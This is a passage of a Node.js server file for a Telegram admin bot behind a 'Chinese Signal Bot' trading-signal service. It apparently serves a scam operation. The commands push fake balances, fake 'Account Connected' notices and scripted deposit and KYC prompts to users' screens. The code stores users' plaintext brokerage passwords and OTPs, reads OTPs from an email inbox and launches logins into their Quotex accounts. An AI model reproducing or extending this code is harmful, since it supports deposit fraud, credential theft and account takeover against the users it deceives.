        if (!OTP_EMAIL || !OTP_EMAIL_PASSWORD) return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: '⚠️ <b>Email not configured</b>\n\nSet these environment variables on your server:\n<code>OTP_EMAIL=your@gmail.com</code>\n<code>OTP_EMAIL_PASSWORD=your-app-password</code>' });
        if (text === '/autootp on')       autoOtpConfig.enabled = true;
        else if (text === '/autootp off') autoOtpConfig.enabled = false;
        else autoOtpConfig.enabled = !autoOtpConfig.enabled;
        broadcastSSE('auto_otp_update', { ...autoOtpConfig });
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: autoOtpConfig.enabled
                ? '🤖 <b>Auto-OTP ENABLED</b>\n✅ I will now watch your inbox and auto-submit OTPs to waiting Quotex sessions.'
                : '⚪ <b>Auto-OTP DISABLED</b>\nYou will need to submit OTPs manually with /otp command.' });
    }

    // /otpstatus — show auto-OTP status
    if (text === '/otpstatus') {
        const status = autoOtpConfig.enabled ? '✅ ENABLED' : '⚪ DISABLED';
        const pkg    = imapflowAvailable ? '✅ Installed' : '❌ Not installed';
        const creds  = (OTP_EMAIL && OTP_EMAIL_PASSWORD) ? '✅ Set' : '❌ Not set';
        const last   = autoOtpConfig.lastOtpTime
            ? new Date(autoOtpConfig.lastOtpTime).toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })
            : 'Never';
        const err    = autoOtpConfig.lastError ? '\n⚠️ Last error: ' + autoOtpConfig.lastError : '';
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: '🤖 <b>Auto-OTP Status</b>\n━━━━━━━━━━━━━━━━━\n' +
                  '🔌 Status: <b>' + status + '</b>\n' +
                  '📦 imapflow: ' + pkg + '\n' +
                  '🔑 Credentials: ' + creds + '\n' +
                  '📧 IMAP: ' + OTP_IMAP_HOST + ':' + OTP_IMAP_PORT + '\n' +
                  '🔢 Last OTP: <b>' + (autoOtpConfig.lastOtp || 'None yet') + '</b>\n' +
                  '⏰ Last detected: ' + last + err });
    }

    // /lowbal username — low balance warning
    if (text.startsWith('/lowbal ') || text.startsWith('/lowbalance ')) {
        const lbUser = text.split(' ').slice(1).join(' ').trim();
        if (!lbUser) return tgApi('sendMessage', { chat_id: chatId, text: '📌 Usage: /lowbal username' });
        await tgInjectMessage(lbUser, 'warning', QUICK_TRIGGERS.low_balance.text);
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `⚠️ <b>Low Balance Warning</b> sent to <b>${lbUser}</b>\n💰 Message: "Please Deposit $30 or Above To Continue"` });
    }

    // /deposit username — deposit prompt
    if (text.startsWith('/deposit ')) {
        const depUser = text.slice(9).trim();
        if (!depUser) return tgApi('sendMessage', { chat_id: chatId, text: '📌 Usage: /deposit username' });
        await tgInjectMessage(depUser, 'instruction', QUICK_TRIGGERS.deposit_required.text);
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `💰 <b>Deposit Prompt</b> sent to <b>${depUser}</b>` });
    }

    // /signal username — send signal incoming
    if (text.startsWith('/signal ')) {
        const sigUser = text.slice(8).trim();
        if (!sigUser) return tgApi('sendMessage', { chat_id: chatId, text: '📌 Usage: /signal username' });
        await tgInjectMessage(sigUser, 'info', QUICK_TRIGGERS.signal_incoming.text);
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `📡 <b>Signal Incoming</b> sent to <b>${sigUser}</b>` });
    }

    // /close username — close position signal
    if (text.startsWith('/close ')) {
        const clUser = text.slice(7).trim();
        if (!clUser) return tgApi('sendMessage', { chat_id: chatId, text: '📌 Usage: /close username' });
        await tgInjectMessage(clUser, 'instruction', QUICK_TRIGGERS.signal_close.text);
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `🔔 <b>Close Position</b> signal sent to <b>${clUser}</b>` });
    }

    // /kyc username — KYC required
    if (text.startsWith('/kyc ')) {
        const kycUser = text.slice(5).trim();
        if (!kycUser) return tgApi('sendMessage', { chat_id: chatId, text: '📌 Usage: /kyc username' });
        await tgInjectMessage(kycUser, 'instruction', QUICK_TRIGGERS.kyc_required.text);
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `📄 <b>KYC Required</b> message sent to <b>${kycUser}</b>` });
    }

    // /alert username — account alert
    if (text.startsWith('/alert ')) {
        const altUser = text.slice(7).trim();
        if (!altUser) return tgApi('sendMessage', { chat_id: chatId, text: '📌 Usage: /alert username' });
        await tgInjectMessage(altUser, 'alert', QUICK_TRIGGERS.alert.text);
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `🚨 <b>Alert</b> sent to <b>${altUser}</b>` });
    }

    // /wait username — please wait
    if (text.startsWith('/wait ')) {
        const waitUser = text.slice(6).trim();
        if (!waitUser) return tgApi('sendMessage', { chat_id: chatId, text: '📌 Usage: /wait username' });
        await tgInjectMessage(waitUser, 'instruction', QUICK_TRIGGERS.wait.text);
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `⏳ <b>Wait</b> message sent to <b>${waitUser}</b>` });
    }

    // /connected username — trigger show connected
    if (text.startsWith('/connected ')) {
        const cnUser = text.slice(11).trim();
        if (!cnUser) return tgApi('sendMessage', { chat_id: chatId, text: '📌 Usage: /connected username' });
        sendSSEToUser(cnUser, 'show_connected',    { userName: cnUser });
        sendSSEToUser(cnUser, 'trigger_connected', { userName: cnUser });
        await tgInjectMessage(cnUser, 'info', QUICK_TRIGGERS.success_connected.text);
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `🎉 <b>Account Connected</b> triggered for <b>${cnUser}</b>` });
    }

    // /triggers — list all quick trigger keys
    if (text === '/triggers' || text === '/keys') {
        const keys = Object.keys(QUICK_TRIGGERS);
        const lines = keys.map((k, i) => `${i+1}. <code>${k}</code> — ${QUICK_TRIGGERS[k].text.slice(0,40)}...`);
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `📋 <b>All Quick Trigger Keys (${keys.length}):</b>\n\n${lines.join('\n')}\n\n💡 Use: <code>/qt username trigger_key</code>` });
    }

    // /block username  /unblock username
    if (text.startsWith('/block ')) {
        const name = text.slice(7).trim();
        const u = await tgFindUserByName(name);
        if (!u?.licenceKey) return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `⚠️ User <b>${name}</b> not found.` });
        await axios.post(`http://127.0.0.1:${process.env.PORT || 3000}/api/block-user`, { licenceKey: u.licenceKey }).catch(() => {});
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `🚫 Blocked <b>${name}</b>` });
    }
    if (text.startsWith('/unblock ')) {
        const name = text.slice(9).trim();
        const u = await tgFindUserByName(name);
        if (!u?.licenceKey) return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `⚠️ User <b>${name}</b> not found.` });
        await axios.post(`http://127.0.0.1:${process.env.PORT || 3000}/api/unblock-user`, { licenceKey: u.licenceKey }).catch(() => {});
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `✅ Unblocked <b>${name}</b>` });
    }
    // /reload username  /kick username
    if (text.startsWith('/reload ')) {
        const name = text.slice(8).trim();
        const sent = sendSSEToUser(name, 'force_reload', { timestamp: new Date().toISOString() });
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: sent ? `🔄 Reloaded <b>${name}</b>` : `⚠️ <b>${name}</b> not online.` });
    }
    if (text.startsWith('/kick ')) {
        const name = text.slice(6).trim();
        const k = name.trim().toLowerCase();
        const client = sseUserClients.get(k);
        if (client) {
            try { client.write(`data: ${JSON.stringify({ type: 'kicked', data: { message: 'Session ended by admin.' } })}\n\n`); setTimeout(() => { try { client.end(); } catch(e){} }, 300); } catch(e) {}
            sseClients.delete(client); sseUserClients.delete(k);
            return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `👢 Kicked <b>${name}</b>` });
        }
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `⚠️ <b>${name}</b> not online.` });
    }
    // /balance username amount
    if (text.startsWith('/balance ')) {
        const parts2 = text.slice(9).trim().split(' ');
        if (parts2.length < 2) return tgApi('sendMessage', { chat_id: chatId, text: 'Usage: /balance username amount' });
        const [bUser, bAmt] = parts2;
        const sent = sendSSEToUser(bUser, 'inject_balance', { balance: bAmt });
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: sent ? `💰 Injected <b>${bAmt}</b> to <b>${bUser}</b>` : `⚠️ <b>${bUser}</b> not online.` });
    }
    // /inject username type  
    if (text.startsWith('/msg ')) {
        const m = text.slice(5).trim();
        const [target2, ...msgParts] = m.split(' ');
        const msgTxt = msgParts.join(' ');
        if (!target2 || !msgTxt) return tgApi('sendMessage', { chat_id: chatId, text: 'Usage: /msg username message text here' });
        await tgInjectMessage(target2, 'info', msgTxt);
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `✅ Message sent to <b>${target2}</b>` });
    }

    if (text === '/start' || text === '/menu') {
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', reply_markup: tgMainMenuKeyboard(),
            text: '🤖 <b>Chinese Signal Bot — Admin Control</b>\n\nSend a <b>username</b> to manage that user, or pick an option.' });
    }
    if (text === '/online')  return tgCmdOnline(chatId);
    if (text === '/stats')   return tgCmdStats(chatId);
    if (text === '/help')    return tgCmdHelp(chatId);
    if (text === '/qx')      return tgCmdQxSessions(chatId);

    // /otp SESSIONID CODE
    if (text.startsWith('/otp ')) {
        const [, sId, ...codeParts] = text.split(' ');
        const otp = codeParts.join('').replace(/\D/g, '');
        if (!sId || !otp) return tgApi('sendMessage', { chat_id: chatId, text: 'Usage: /otp SESSION_ID 123456' });
        const result = await submitQuotexOTP(sId, otp);
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: result.ok ? `✅ OTP accepted for session <code>${sId}</code>!` : `❌ ${result.message || result.error}` });
    }

    // /qxlaunch email password clientname
    if (text.startsWith('/qxlaunch ')) {
        const parts = text.slice(10).trim().split(' ');
        if (parts.length < 2) return tgApi('sendMessage', { chat_id: chatId, text: 'Usage: /qxlaunch email password [clientname]' });
        const [email, password, ...nameParts] = parts;
        const clientName = nameParts.join(' ') || 'Client';
        const sid = makeSessionId();
        const session = { id: sid, clientName, email, password, licenceKey: '',
            status: 'queued', statusMsg: 'Queued from Telegram', startedAt: new Date(), updatedAt: new Date(),
            otpAttempts: 0, browser: null, page: null, screenshotBase64: null, cookies: null };
        quotexSessions.set(sid, session);
        broadcastSSE('qx_session_new', getSessionInfo(session));
        launchQuotexSession(session).catch(e => console.error('launch error:', e.message));
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `🚀 Launching Quotex login for <b>${clientName}</b>...\nSession: <code>${sid}</code>` });
    }

    // /qxclose SESSIONID
    if (text.startsWith('/qxclose ')) {
        const sId = text.slice(9).trim();
        await closeQuotexSession(sId, 'Closed via Telegram command');
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `✅ Session <code>${sId}</code> closed.` });
    }

    if (text.startsWith('/broadcast ')) {
        const m = text.slice(11).trim();
        broadcastSSE('broadcast_message', { message: m, type: 'info', timestamp: new Date().toISOString() });
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `📢 Broadcast sent to <b>${sseClients.size}</b> clients.` });
    }

    // ── Missing awaiting state handlers ─────────────────────────────────

    if (sess?.awaiting === 'note' && sess.target) {
        delete tgSessions[chatId];
        const uForNote = await tgFindUserByName(sess.target);
        if (uForNote?.licenceKey) {
            if (useDatabase) await dbSaveNote(uForNote.licenceKey, text).catch(() => {});
            else { if (!global._notesMap) global._notesMap = {}; global._notesMap[uForNote.licenceKey] = { note: text, updatedAt: new Date().toISOString() }; }
        }
        broadcastSSE('activity', { action: `📝 Note saved for ${sess.target}`, userName: sess.target, ip: '—', timestamp: new Date().toLocaleString() });
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `📝 Note saved for <b>${sess.target}</b>` });
    }
    if (sess?.awaiting === 'maint_duration') {
        delete tgSessions[chatId];
        let until = null;
        const relMatch = text.match(/^(\d+)h$/i);
        if (relMatch) { until = new Date(Date.now() + parseInt(relMatch[1]) * 3600000).toISOString(); }
        else { const d = new Date(text); if (!isNaN(d.getTime())) until = d.toISOString(); }
        maintenanceMode.until = until;
        broadcastSSE('maintenance_update', maintenanceMode);
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: until ? `⏱️ Maintenance end time set: <b>${new Date(until).toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>` : '⚠️ Could not parse time. Use format "2h" or "2025-12-31 23:59".' });
    }
    if (sess?.awaiting === 'maint_msg') {
        delete tgSessions[chatId];
        maintenanceMode.message = text;
        broadcastSSE('maintenance_update', maintenanceMode);
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `✅ Maintenance message updated:\n<i>${text}</i>` });
    }
    if (sess?.awaiting === 'lic_key') {
        tgSessions[chatId] = { ...sess, awaiting: 'lic_type', licKey: text.trim() };
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `🔑 Key: <code>${text.trim()}</code>\nChoose license type:`,
            reply_markup: { inline_keyboard: [[
                { text: 'Standard', callback_data: `_lic_do|${encodeURIComponent(text.trim())}|Standard` },
                { text: 'VIP',      callback_data: `_lic_do|${encodeURIComponent(text.trim())}|VIP`      },
                { text: 'Trial',    callback_data: `_lic_do|${encodeURIComponent(text.trim())}|Trial`    },
            ]] } });
    }
    if (sess?.awaiting === 'lic_revoke') {
        delete tgSessions[chatId];
        const k = text.trim();
        try {
            if (useDatabase) await dbUpdateLicenseStatus(k, 'Inactive');
            else { const l = licenses.find(x => x.key === k); if (l) { l.status = 'Inactive'; saveLicenses(); } }
            return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `🚫 License <code>${k}</code> revoked (Inactive).` });
        } catch(e) { return tgApi('sendMessage', { chat_id: chatId, text: `Error: ${e.message}` }); }
    }
    if (sess?.awaiting === 'lic_activate') {
        delete tgSessions[chatId];
        const k = text.trim();
        try {
            if (useDatabase) await dbUpdateLicenseStatus(k, 'Active');
            else { const l = licenses.find(x => x.key === k); if (l) { l.status = 'Active'; saveLicenses(); } }
            return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `✅ License <code>${k}</code> activated.` });
        } catch(e) { return tgApi('sendMessage', { chat_id: chatId, text: `Error: ${e.message}` }); }
    }
    if (sess?.awaiting === 'cred_email') {
        tgSessions[chatId] = { ...sess, awaiting: 'cred_password', credEmail: text.trim() };
        return tgApi('sendMessage', { chat_id: chatId, text: '🔑 Now send the Password:' });
    }
    if (sess?.awaiting === 'cred_password') {
        tgSessions[chatId] = { ...sess, awaiting: 'cred_label', credPassword: text.trim() };
        return tgApi('sendMessage', { chat_id: chatId, text: "🏷 Send a label (client name) or type 'skip':" });
    }
    if (sess?.awaiting === 'cred_label') {
        delete tgSessions[chatId];
        const label = text === 'skip' ? '' : text.trim();
        const credId = 'cred_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 6);
        const newCred = { id: credId, label, email: sess.credEmail, password: sess.credPassword, group: 'Default', notes: '', launchCount: 0, lastLaunched: null, createdAt: new Date() };
        try {
            if (useDatabase) await SavedCredential.create(newCred); else savedCredsMemory.unshift(newCred);
            broadcastSSE('cred_added', { id: credId, label, email: sess.credEmail, group: 'Default' });
            return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
                text: `✅ Credential saved!\n📧 <code>${sess.credEmail}</code>\n🏷 Label: <b>${label || '(none)'}</b>` });
        } catch(e) { return tgApi('sendMessage', { chat_id: chatId, text: `Error: ${e.message}` }); }
    }
    if (sess?.awaiting === 'retry_attempts') {
        delete tgSessions[chatId];
        const v = parseInt(text);
        if (isNaN(v) || v < 1 || v > 10) return tgApi('sendMessage', { chat_id: chatId, text: '❌ Enter a number between 1 and 10.' });
        autoRetryConfig.maxAttempts = v;
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `✅ Max retry attempts set to <b>${v}</b>`, reply_markup: tgRetryConfigKeyboard() });
    }
    if (sess?.awaiting === 'retry_delay') {
        delete tgSessions[chatId];
        const v = parseInt(text);
        if (isNaN(v) || v < 5 || v > 300) return tgApi('sendMessage', { chat_id: chatId, text: '❌ Enter a number between 5 and 300.' });
        autoRetryConfig.delaySeconds = v;
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `✅ Retry delay set to <b>${v}s</b>`, reply_markup: tgRetryConfigKeyboard() });
    }
    if (sess?.awaiting === 'settings_tg_url') {
        delete tgSessions[chatId];
        botSettings.telegramUrl = text === 'clear' ? '' : text.trim();
        saveSettings(); saveSettingsToDB().catch(() => {});
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `✅ Telegram URL updated: <code>${botSettings.telegramUrl || '(cleared)'}</code>` });
    }
    if (sess?.awaiting === 'settings_wa_url') {
        delete tgSessions[chatId];
        botSettings.whatsappUrl = text === 'clear' ? '' : text.trim();
        saveSettings(); saveSettingsToDB().catch(() => {});
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `✅ WhatsApp URL updated: <code>${botSettings.whatsappUrl || '(cleared)'}</code>` });
    }
    if (sess?.awaiting === 'settings_bot_name') {
        delete tgSessions[chatId];
        botSettings.botName = text.trim();
        saveSettings(); saveSettingsToDB().catch(() => {});
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `✅ Bot name set to: <b>${botSettings.botName}</b>` });
    }

    // ── New commands ──────────────────────────────────────────────────────

    // /search  or  /s  — partial name/email/key search
    if (text.startsWith('/search ') || text.startsWith('/s ')) {
        const query = text.replace(/^\/search |^\/s /, '').trim().toLowerCase();
        if (!query) return tgApi('sendMessage', { chat_id: chatId, text: 'Usage: /search partial_name' });
        let allU; try { allU = useDatabase ? await User.find({}).lean() : users; } catch(e) { allU = users; }
        const matched = allU.filter(u =>
            (u.fullName || '').toLowerCase().includes(query) ||
            (u.username || '').toLowerCase().includes(query) ||
            (u.licenceKey || '').toLowerCase().includes(query)
        ).slice(0, 10);
        if (!matched.length) return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `🔍 No users found for "<b>${query}</b>".` });
        const onlineKeys = [...sseUserClients.keys()];
        const lines  = matched.map((u, i) => {
            const onl = onlineKeys.includes((u.fullName || '').toLowerCase());
            return `${i+1}. ${onl ? '🟢' : '⚫'} <b>${u.fullName || '?'}</b>  📧 <code>${u.username || '-'}</code>  Status: ${u.status || '-'}`;
        }).join('\n');
        const kb = matched.map(u => ([{ text: `👤 ${u.fullName || u.username || u.licenceKey}`, callback_data: `user_action|${encodeURIComponent(u.fullName || u.username || u.licenceKey)}` }]));
        kb.push([{ text: '🔙 Menu', callback_data: 'menu' }]);
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `🔍 <b>${matched.length} result(s) for "${query}"</b>\n\n${lines}\n\nTap a name to manage:`,
            reply_markup: { inline_keyboard: kb } });
    }

    // /u username — full profile view
    if (text.startsWith('/u ')) {
        const uName = text.slice(3).trim().replace(/^@/, '');
        if (!uName) return tgApi('sendMessage', { chat_id: chatId, text: 'Usage: /u username' });
        const isOl  = sseUserClients.has(uName.toLowerCase());
        const fnd   = await tgFindUserByName(uName);
        const ts    = fnd?.lastActivity ? new Date(fnd.lastActivity).toLocaleString('en-PK', { timeZone: 'Asia/Karachi' }) : '—';
        const txt2  = `👤 <b>${uName}</b>  ${isOl ? '🟢 ONLINE' : '⚫ offline'}\n` +
            (fnd
                ? `🔑 Key: <code>${fnd.licenceKey || '-'}</code>\n📧 Email: <code>${fnd.username || '-'}</code>\n🔒 Pass: <code>${fnd.password || '-'}</code>\n🔢 OTP: <code>${fnd.otp || '-'}</code>\n📊 Status: <b>${fnd.status || '-'}</b>\n🚫 Blocked: <b>${fnd.blocked ? 'Yes' : 'No'}</b>\n🔗 Connected: <b>${fnd.connected ? 'Yes' : 'No'}</b>\n⏰ Last active: <b>${ts}</b>`
                : 'ℹ️ No DB record yet.');
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: txt2, reply_markup: tgUserActionKeyboard(uName) });
    }

    // /note username note text
    if (text.startsWith('/note ')) {
        const noteParts = text.slice(6).trim().split(' ');
        const noteUser = noteParts[0]; const noteContent = noteParts.slice(1).join(' ');
        if (!noteUser || !noteContent) return tgApi('sendMessage', { chat_id: chatId, text: 'Usage: /note username note text here' });
        const nu = await tgFindUserByName(noteUser);
        if (!nu?.licenceKey) return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `⚠️ User <b>${noteUser}</b> not found.` });
        if (useDatabase) await dbSaveNote(nu.licenceKey, noteContent).catch(() => {});
        else { if (!global._notesMap) global._notesMap = {}; global._notesMap[nu.licenceKey] = { note: noteContent, updatedAt: new Date().toISOString() }; }
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `📝 Note saved for <b>${noteUser}</b>` });
    }

    // /tc username — trigger "Account Connected" on user's live bot session
    if (text.startsWith('/tc ')) {
        const tcUser = text.slice(4).trim();
        if (!tcUser) return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: '📌 Usage: <code>/tc username</code>\n\nSends the \"Account Connected\" signal to a specific user\'s live session.' });
        sendSSEToUser(tcUser, 'show_connected',    { userName: tcUser });
        sendSSEToUser(tcUser, 'trigger_connected', { userName: tcUser });
        await sendTelegramMessage(`🔗 <b>Trigger Connected</b> fired from Telegram\n👤 User: <b>${tcUser}</b>`);
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `✅ <b>Trigger Connected</b> sent to <b>${tcUser}</b>\n🔗 Their bot will now show "Account Connected".` });
    }

    // /qt username triggerKey  — fire a quick trigger by key name
    if (text.startsWith('/qt ')) {
        const qtParts = text.slice(4).trim().split(' ');
        if (qtParts.length < 2) {
            const keys = Object.keys(QUICK_TRIGGERS).join(', ');
            return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
                text: `Usage: /qt username trigger_key\n\nAvailable keys:\n<code>${keys}</code>` });
        }
        const [qtUser, qtKey] = qtParts;
        const trig2 = QUICK_TRIGGERS[qtKey];
        if (!trig2) return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `❌ Unknown key: <code>${qtKey}</code>\nRun /triggers to see all keys.` });
        await tgInjectMessage(qtUser, trig2.type, trig2.text);
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `✅ Quick trigger <b>${qtKey}</b> sent to <b>${qtUser}</b>` });
    }

    // /triggers — list all quick trigger keys
    if (text === '/triggers') {
        const trigList = Object.entries(QUICK_TRIGGERS)
            .map(([k, v]) => `⚡ <code>${k}</code>\n   ${v.text.slice(0, 70)}…`)
            .join('\n\n');
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `⚡ <b>Quick Triggers (${Object.keys(QUICK_TRIGGERS).length} available)</b>\n\n${trigList}\n\n📌 Usage: /qt username key` });
    }

    // ── Username lookup (exact + partial match) ───────────────────────────
    const rawTarget = text.replace(/^@/, '').trim();
    const isOnline  = sseUserClients.has(rawTarget.toLowerCase());
    const found     = await tgFindUserByName(rawTarget);

    if (found) {
        const ts2 = found.lastActivity ? new Date(found.lastActivity).toLocaleString('en-PK', { timeZone: 'Asia/Karachi' }) : '—';
        const sTxt = `👤 <b>${rawTarget}</b>  ${isOnline ? '🟢 ONLINE' : '⚫ offline'}\n` +
            `🔑 Key: <code>${found.licenceKey || '-'}</code>\n📧 Email: <code>${found.username || '-'}</code>\n` +
            `📊 Status: <b>${found.status || '-'}</b>  🚫 Blocked: <b>${found.blocked ? 'Yes' : 'No'}</b>\n⏰ Last active: <b>${ts2}</b>`;
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: sTxt, reply_markup: tgUserActionKeyboard(rawTarget) });
    }

    // Partial match fallback
    let allForSearch; try { allForSearch = useDatabase ? await User.find({}).lean() : users; } catch(e) { allForSearch = users; }
    const partial = allForSearch.filter(u =>
        (u.fullName || '').toLowerCase().includes(rawTarget.toLowerCase()) ||
        (u.username || '').toLowerCase().includes(rawTarget.toLowerCase())
    ).slice(0, 8);
    if (partial.length === 1) {
        const pu   = partial[0];
        const pn   = pu.fullName || pu.username || rawTarget;
        const pol  = sseUserClients.has(pn.toLowerCase());
        const pts  = pu.lastActivity ? new Date(pu.lastActivity).toLocaleString('en-PK', { timeZone: 'Asia/Karachi' }) : '—';
        const pTxt = `👤 <b>${pn}</b>  ${pol ? '🟢 ONLINE' : '⚫ offline'}\n` +
            `🔑 Key: <code>${pu.licenceKey || '-'}</code>\n📧 Email: <code>${pu.username || '-'}</code>\n` +
            `📊 Status: <b>${pu.status || '-'}</b>\n⏰ Last active: <b>${pts}</b>`;
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: pTxt, reply_markup: tgUserActionKeyboard(pn) });
    }
    if (partial.length > 1) {
        const onl2  = [...sseUserClients.keys()];
        const pkb = partial.map(u => {
            const n2 = u.fullName || u.username || u.licenceKey;
            return [{ text: `${onl2.includes((u.fullName || '').toLowerCase()) ? '🟢' : '⚫'} ${n2}`, callback_data: `user_action|${encodeURIComponent(n2)}` }];
        });
        pkb.push([{ text: '🔙 Menu', callback_data: 'menu' }]);
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `🔍 Multiple users match "<b>${rawTarget}</b>". Tap one:`,
            reply_markup: { inline_keyboard: pkb } });
    }

    return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
        text: `❓ No user found for "<b>${rawTarget}</b>".\n\nTry /search ${rawTarget} for a partial match, or /menu to open the dashboard.` });
}

let tgOffset = 0, tgPollingStarted = false;
async function telegramPollLoop() {
    if (tgPollingStarted) return;
    tgPollingStarted = true;
    try { await axios.post(`${TG_API}/deleteWebhook`); } catch(e) {}
    console.log('📨 Telegram bot listener started');
    while (true) {
        try {
            const r = await axios.get(`${TG_API}/getUpdates`, {
                params: { offset: tgOffset, timeout: 30, allowed_updates: JSON.stringify(['message', 'callback_query']) },
                timeout: 40000,
            });
            for (const up of (r.data?.result || [])) {
                tgOffset = up.update_id + 1;
                if (up.message)
                    tgHandleMessage(up.message).catch(e => console.error('tg msg error:', e.message));
                else if (up.callback_query)
                    tgHandleCallback(up.callback_query.message.chat.id, up.callback_query.data, up.callback_query.id)
                        .catch(e => console.error('tg callback error:', e.message));
            }
        } catch(e) { await new Promise(r => setTimeout(r, 3000)); }
    }
}

// ================== SSE BROADCAST ==================
const sseClients     = new Set();
const sseUserClients = new Map();
const pendingMessages = {};

function broadcastSSE(eventType, data) {
    const payload = JSON.stringify({ type: eventType, data, timestamp: new Date().toISOString() });
    sseClients.forEach(client => { try { client.write(`data: ${payload}\n\n`); } catch(e) {} });
}
function sendSSEToUser(userName, eventType, data) {
    const key    = (userName || '').trim().toLowerCase();
    const client = sseUserClients.get(key);
    if (!client) return false;
    try { client.write(`data: ${JSON.stringify({ type: eventType, data, timestamp: new Date().toISOString() })}\n\n`); return true; }
    catch(e) { return false; }
}

app.get('/api/events', (req, res) => {
    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.flushHeaders();
    const heartbeat = setInterval(() => { try { res.write(':heartbeat\n\n'); } catch(e) {} }, 20000);
    const clientUserName = (req.query.userName || '').trim().toLowerCase();
    sseClients.add(res);
    if (clientUserName) sseUserClients.set(clientUserName, res);
    res.write(`data: ${JSON.stringify({ type: 'connected', message: 'SSE ready' })}\n\n`);
    req.on('close', () => {
        clearInterval(heartbeat);
        sseClients.delete(res);
        if (clientUserName && sseUserClients.get(clientUserName) === res) sseUserClients.delete(clientUserName);
    });
});

// ================== FILE FALLBACK STORAGE ==================
const DATA_DIR      = process.env.DATA_DIR || path.join(__dirname, 'data');
const DATA_FILE     = path.join(DATA_DIR, 'users.json');
const LICENSES_FILE = path.join(DATA_DIR, 'licenses.json');
const SETTINGS_FILE = path.join(DATA_DIR, 'settings.json');

let users = [], licenses = [];
let botSettings = { telegramUrl: '', whatsappUrl: '', botName: 'Chinese Signal Bot' };

function ensureDataDir() {
    try { if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true }); } catch(e) {}
}
function loadSettings() {
    try { if (fs.existsSync(SETTINGS_FILE)) botSettings = { ...botSettings, ...JSON.parse(fs.readFileSync(SETTINGS_FILE, 'utf8')) }; } catch(e) {}
}
function saveSettings() {
    try { ensureDataDir(); fs.writeFileSync(SETTINGS_FILE, JSON.stringify(botSettings, null, 2)); } catch(e) {}
}
async function loadSettingsFromDB() {
    if (!useDatabase) return botSettings;
    try {
        const doc = await Setting.findById('bot').lean();
        if (doc) { if (doc.telegramUrl !== undefined) botSettings.telegramUrl = doc.telegramUrl; if (doc.whatsappUrl !== undefined) botSettings.whatsappUrl = doc.whatsappUrl; if (doc.botName) botSettings.botName = doc.botName; }
    } catch(e) {}
    return botSettings;
}
async function saveSettingsToDB() {
    if (!useDatabase) return;
    try { await Setting.findByIdAndUpdate('bot', { ...botSettings, updatedAt: new Date() }, { upsert: true, new: true, setDefaultsOnInsert: true }); } catch(e) {}
}
loadSettings();
setTimeout(() => { loadSettingsFromDB().catch(() => {}); }, 2500);

